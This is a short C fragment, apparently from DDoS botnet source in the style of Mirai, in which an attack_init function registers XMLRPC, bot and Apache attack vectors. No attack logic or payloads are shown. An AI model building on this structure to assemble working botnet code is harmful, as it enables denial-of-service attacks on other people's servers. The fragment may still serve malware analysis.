...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_XMLRPC , (ATTACK_FUNC)attack_app_XMLRPC);
    add_attack(ATK_VEC_BOT , (ATTACK_FUNC)attack_app_bot);
    add_attack(ATK_VEC_APACHE , (ATTACK_FUNC)attack_app_APACHE);
